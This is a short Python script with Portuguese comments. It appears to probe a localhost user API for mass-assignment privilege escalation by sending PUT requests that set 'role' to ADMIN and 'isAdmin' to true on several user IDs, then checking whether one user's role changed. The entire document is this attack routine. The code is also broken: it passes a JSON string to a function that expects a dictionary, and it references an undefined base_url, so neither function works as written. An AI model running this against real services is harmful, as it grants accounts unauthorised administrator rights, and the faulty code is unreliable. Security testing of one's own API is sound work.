import json
import requests

# Bloco A: Função para adicionar as chaves auxiliares ao dicionário JSON
def inject_admin_keys(data):
  modified_data = data.copy()
  modified_data.update({'role': 'ADMIN', 'isAdmin': True}) 
  return modified_data

# Bloco B: Loop que realiza requisições PUT para atualizar os usuários
def send_updates(target_ids, base_url="http://localhost:8080/api/users/"):
  for id in target_ids:
    try:
      response = requests.put(f"{base_url}{id}", json=inject_admin_keys(json.dumps({"role": 'ADMIN', 'isAdmin': True} ) ))
      if response.status_code == 200:
        print(f"User {id} updated successfully.")
      else:
        print(f"Update failed for user {id}. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error updating user {id}: {e}")

# Bloco C: Verificar se a chave 'role' retornado pelo backend é 'ADMIN'
def validate_api_response(target_id):
  url = f"{base_url}{target_id}/"
  try:
    response = requests.get(url)
    if response.status_code == 200:
      data = json.loads(response.text)
      role = data.get('role') 

      if role == 'ADMIN':
        print("Falha de Validação Lógica Encontrada no Endpoint.")
      else:
        print(f"User {target_id} updated successfully")  
    else:
      print(f"Failed to retrieve user data for ID: {target_id}, Status code: {response.status_code}")
  except Exception as e: 
    print(f"Error retrieving user data for ID {target_id}: {e}")

# Exemplo de uso
target_ids = [1, 2, 3] # Listar IDs que deseja testar
send_updates(target_ids) 
validate_api_response(1)  